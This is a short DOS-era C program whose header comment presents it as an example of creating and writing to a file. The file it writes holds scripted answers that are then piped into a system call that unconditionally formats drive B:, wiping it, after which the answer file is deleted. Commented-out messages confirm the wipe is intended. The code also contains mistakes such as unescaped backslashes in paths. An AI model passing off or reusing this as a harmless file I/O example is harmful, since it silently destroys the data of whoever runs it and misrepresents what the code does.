
  /* Creating a file using C then writing to it. */

#include "stdio.h"

 main()
  {

   int option, x, y, clrscr, l;
   char *inf[]= {
     "\n",
     "\n",
     "N\n"
   };
   char opt[80];
   FILE *fp;

   if((fp = fopen("d:\qc2\student\info.dat", "w+"))==NULL) {
     printf("Could not create file\n");
     exit(1);
   }
   /* else {
     fp=fopen("info.dat", "w+");
     fclose(fp);
   }  */
   rewind(fp);
   /* fp=fopen("info.dat", "w+"); */
   for(l=0; l<3; l++) {
     fputs(inf[l], fp);
   }
   fclose(fp);
   system("b:");
   /* printf("Now in B drive\n"); */
   system("format! b: /u/f:1.44 < d:\qc2\student\info.dat");
   /* printf("You will now have seen the B drive wiped\n"); */
   /* printf("Bye. Bye.\n"); */
   system("d:");

   /* system("type info.dat"); */
   system("del d:\qc2\student\info.dat");
   fclose(fp);

 }

